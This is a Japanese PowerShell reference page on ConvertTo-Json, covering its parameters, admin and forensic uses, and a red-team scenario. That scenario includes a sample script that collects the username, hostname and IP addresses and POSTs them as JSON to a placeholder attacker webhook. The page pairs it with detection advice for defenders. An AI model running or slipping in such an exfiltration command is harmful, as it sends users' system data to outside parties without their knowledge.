---
tags:
  - 'ConvertTo-Json'
  - 'powershell'
  - 'cheatsheet'
title: 'ConvertTo-Json - オブジェクトをJSON文字列に変換する'
summary: 'PowerShellオブジェクトを、Web APIや設定ファイルで一般的に使用されるJSON (JavaScript Object Notation) 形式の文字列に変換します。'
related:
  - 'ConvertFrom-Json'
  - 'Invoke-RestMethod'
---

# `ConvertTo-Json` - オブジェクトをJSON文字列に変換する

## 概要

`ConvertTo-Json` コマンドレットは、PowerShellのオブジェクト（カスタムオブジェクト、ハッシュテーブル、プロセスオブジェクトなど）を、JSON形式の文字列に変換します。このコマンドレットは、PowerShellで処理した結果をWeb APIのリクエストボディとして送信したり、アプリケーションの設定ファイル (`.json`) を生成したりする際に不可欠です。

## 類似コマンドレット/コマンドとの差異

| 類似コマンドレット/コマンド | 差異 / 使い分けのポイント |
| :--- | :--- |
| **`ConvertFrom-Json`** | `ConvertFrom-Json` は `ConvertTo-Json` の逆の操作を行います。JSON形式の**文字列**をPowerShell**オブジェクト**に変換します。 |
| **`Invoke-RestMethod`** | `Invoke-RestMethod` は、`-Body` パラメータに渡されたPowerShellオブジェクトを**自動的にJSONに変換**してAPIに送信します。明示的に `ConvertTo-Json` を使う必要がない場合が多いです。 |

## よく連携されるコマンドレット

### シナリオ例: システム情報をJSON形式でWeb APIに送信する (インフラ構築・運用視点)

* **目的**: 現在のシステムの基本情報（ホスト名、OSバージョン）をPowerShellオブジェクトとして作成し、それをJSON形式に変換してWeb APIにPOSTリクエストで送信する。
* **連携コマンドレット**: `Invoke-RestMethod`
* **解説**: まず、送信したいデータを持つカスタムオブジェクト (`[PSCustomObject]`) を作成します。次に `ConvertTo-Json` でそれをJSON文字列に変換し、`Invoke-RestMethod` の `-Body` パラメータに渡してAPIに送信します。
* **コマンド例**:

    ```powershell
    # 送信するデータオブジェクトを作成
    $systemData = [PSCustomObject]@{
        Hostname = $env:COMPUTERNAME
        OSVersion = (Get-ComputerInfo).OsVersion
        Timestamp = Get-Date
    }

    # オブジェクトをJSON文字列に変換
    $jsonBody = $systemData | ConvertTo-Json

    # Web APIにJSONデータをPOST
    Invoke-RestMethod -Uri "[https://api.example.com/inventory](https://api.example.com/inventory)" -Method Post -Body $jsonBody -ContentType "application/json"
    ```

## パラメータ説明

| パラメータ | 型 | 説明 |
| :--- | :--- | :--- |
| ⭐ **`-InputObject`** | `Object` | JSONに変換するオブジェクトを指定します。パイプラインからの入力を受け取ります。 |
| **`-Depth`** | `Int32` | 変換するオブジェクトのネストの最大深度を指定します。デフォルトは2です。これより深い階層は切り捨てられるため、注意が必要です。 |
| ⭐ **`-Compress`** | `SwitchParameter` | 出力されるJSON文字列から空白やインデントを削除し、1行に圧縮します。APIリクエストなどでデータサイズを小さくしたい場合に使用します。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: アプリケーション用の設定ファイルをスクリプトで動的に生成する。
* **組み合わせ**: `ConvertTo-Json | Out-File`
* **解説**: PowerShellのハッシュテーブルやカスタムオブジェクトで設定を定義し、それを `ConvertTo-Json` でJSON文字列に変換した後、`Out-File` でファイルに保存します。
* **例**:

    ```powershell
    # 設定をハッシュテーブルで定義
    $config = @{
        ConnectionStrings = @{
            DefaultConnection = "Server=db-prod;Database=main;..."
        }
        Logging = @{
            LogLevel = "Information"
        }
    }

    # ハッシュテーブルをJSONに変換し、ファイルに保存
    $config | ConvertTo-Json -Depth 5 | Out-File -FilePath ".\appsettings.json" -Encoding UTF8
    ```

### 2. ブルーチーム視点

* **タスク**: 収集したフォレンジックアーティファクト（例: 不審なプロセスのリスト）を、分析システムに取り込むためにJSON形式でエクスポートする。
* **組み合わせ**: `Get-Process`, `ConvertTo-Json`
* **解説**: `Get-Process` や `Get-WinEvent` などで収集した情報をオブジェクトのまま `ConvertTo-Json` に渡すことで、構造化されたデータとして簡単にエクスポートできます。
* **例**:

    ```powershell
    # 'svchost' という名前のプロセスの詳細情報をJSON形式で出力
    Get-Process -Name "svchost" | Select-Object Name, Id, Path | ConvertTo-Json
    ```

### 3. レッドチーム視点

* **タスク**: **データ窃取 (Data Exfiltration)**。収集した情報をJSON形式にエンコードし、Webhookなどを通じて外部に送信する。
* **組み合わせ**: `ConvertTo-Json -Compress`
* **解説**: 攻撃者は、窃取したユーザー情報、システム情報、ネットワーク設定などをPowerShellオブジェクトとして収集し、`ConvertTo-Json -Compress` で1行のコンパクトな文字列に変換します。この文字列をPOSTリクエストのボディに含めて、監視されにくいHTTP/HTTPS経由で外部のC2サーバーに送信します。
* **例**:

    ```powershell
    # 収集したデータをJSONに圧縮してWebhookで送信
    $exfilData = @{
        user = $env:USERNAME
        hostname = $env:COMPUTERNAME
        ip = (Get-NetIPAddress).IPAddress
    }
    $jsonPayload = $exfilData | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri "[https://attacker.webhook.site/](https://attacker.webhook.site/)..." -Method Post -Body $jsonPayload
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1. **現象**: JSONの出力が途中で切れている、または `...` で省略されている。
    * **考えられる原因**: オブジェクトの階層が `-Depth` パラメータのデフォルト値（2）よりも深いためです。
    * **解決策**: `ConvertTo-Json -Depth <number>` のように、オブジェクトの階層に合わせて十分な深度を指定してください。

## セキュリティに関する考慮事項

### 悪用事例

* **データ窃取 (Data Exfiltration)**: レッドチームのシナリオで述べた通り、`ConvertTo-Json` は窃取した情報を構造化し、HTTP/HTTPS経由で外部に送信するためのペイロードを作成するのに非常に便利なツールとして悪用されます。

### LOLBASにおける利用例

* **機能**: **データ収集 (Data Collection)**, **データ窃取 (Data Exfiltration)**
* **解説**: `ConvertTo-Json` はPowerShellの標準機能であり、攻撃者が収集した情報を外部送信に適した形式にエンコードするために利用されます。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: -
* **Detection (検知)**: PowerShellのスクリプトブロックロギング (イベントID 4104) を有効化し、`ConvertTo-Json` の実行、特にその結果が `Invoke-RestMethod` や `System.Net.WebClient` などに渡される一連の通信を監視する。ネットワークレベルで、予期せぬ宛先へのHTTP/HTTPS POSTリクエストを監視・ブロックする。

## 注意点・補足

* **`[PSCustomObject]` vs `Hashtable`**: ハッシュテーブル (`@{}`) はキーの順序を保証しません。JSONのプロパティ順序を維持したい場合は、`[PSCustomObject]` を使用するのが一般的です。

---
[PowerShellインデックスに戻る](../../powershell_index.md)
